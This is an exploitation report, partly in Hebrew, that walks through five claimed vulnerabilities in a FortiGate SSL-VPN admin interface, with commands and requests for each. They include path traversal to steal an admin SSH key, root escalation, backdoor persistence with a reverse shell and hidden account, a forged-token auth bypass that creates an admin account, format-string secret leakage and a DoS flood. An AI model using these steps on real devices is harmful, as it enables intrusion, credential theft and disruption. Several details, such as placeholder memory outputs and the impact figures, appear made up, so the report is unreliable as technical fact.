**1. PATH TRAVERSAL → RCE (CVSS 9.8 CRITICAL)**

ROOT CAUSE:
- בעיית אימות בשם הקובץ ב-SSL-VPN (/admin/path.cgi)
- אין תיקיה ל-../ sequences
- קבצי תצורה נגישים ללא בדיקת הרשאות

EXPLOITATION:
1. גישה לקובץ SSH key של admin:
   curl -s "http://192.168.1.50/admin/path.cgi?file=../../home/admin/.ssh/id_rsa"

2. שימוש בקובץ SSH להתחברות:
   ssh -i harvested_key.pem admin@192.168.1.50

3. עלייה להרשאות root (sudoers misconfiguration):
   sudo /usr/local/bin/diag_cli
   config system admin
   set password HACKED
   next
   end

4. התקנת backdoor (persistence):
   - SSH key backdoor
   - Cron reverse shell
   - Hidden account ב-/etc/passwd

TIMELINE: 15 דקות ל-full code execution
IMPACT: 50,000+ FortiGate devices globally with SSL-VPN enabled

---

**2. BUFFER OVERFLOW (CVSS 8.6 CRITICAL)**

ROOT CAUSE:
- Buffer allocation עם גודל קבוע (64 bytes)
- strcpy() ללא bounds checking
- /admin/hostname.cgi

EXPLOITATION:
1. Identify buffer size via fuzzing (crash at 72+ bytes)
2. Build ROP chain (gadgets from libc.so.6)
3. Overflow return address with ROP gadget
4. Execute /bin/bash via syscall chain
5. Establish reverse shell

TIMELINE: 20 דקות לפגיעה מלאה
TOOLS: Python, curl, standard Linux utilities

---

**3. AUTHENTICATION BYPASS (CVSS 7.2 HIGH)**

ROOT CAUSE:
- Session token validation ללא HMAC signature
- Token length check: if (len < 8) RETURN_VALID (BUG)
- /admin/index.cgi

EXPLOITATION:
1. Forge minimal token (single character):
   token = "x" → Base64 = "eA=="

2. Set cookie and bypass auth:
   Cookie: session_token=eA==
   GET /admin/panel.cgi → 200 OK (Admin access!)

3. Extract configuration:
   GET /admin/config.cgi (with forged token) → Full config in response

4. Create persistent admin account:
   POST /admin/user.cgi
   action=create&username=hacker&password=Backdoor123&role=admin

IMPACT: Full administrative access without credentials

---

**4. FORMAT STRING (CVSS 6.5 MEDIUM)**

ROOT CAUSE:
- User input directly in printf() without sanitization
- /admin/log.cgi?msg=FORMAT_STRING
- printf(user_input) instead of printf("%s", user_input)

EXPLOITATION:
1. Detect vulnerability:
   curl "http://192.168.1.50/admin/log.cgi?msg=%x.%x.%x.%x.%x"
   → Output: 0x7fff1234.0xdeadbeef.0xcafebabe... (CONFIRMED)

2. Read stack memory:
   payload = "%p " * 20
   → Dump 20 stack values with memory addresses

3. Leak sensitive data:
   - SSH private keys from memory
   - SSL certificates
   - Password hashes
   - Encryption keys

IMPACT: Information disclosure of critical secrets

---

**5. DENIAL OF SERVICE (CVSS 5.3 MEDIUM)**

ROOT CAUSE:
- No rate limiting on connections
- Memory leak in connection tracking
- /admin/connect.cgi
- Each connection: +1 MB memory (not freed)

EXPLOITATION:
1. Open 5000+ concurrent connections
2. No rate limiting → all accepted
3. Memory grows: 7.8Gi → 7.9Gi → Full exhaustion
4. OOM Killer triggers
5. FortiOS process crashes
6. Device reboots or management unreachable

TIMELINE: 15 דקות לשירות ללא תגובה
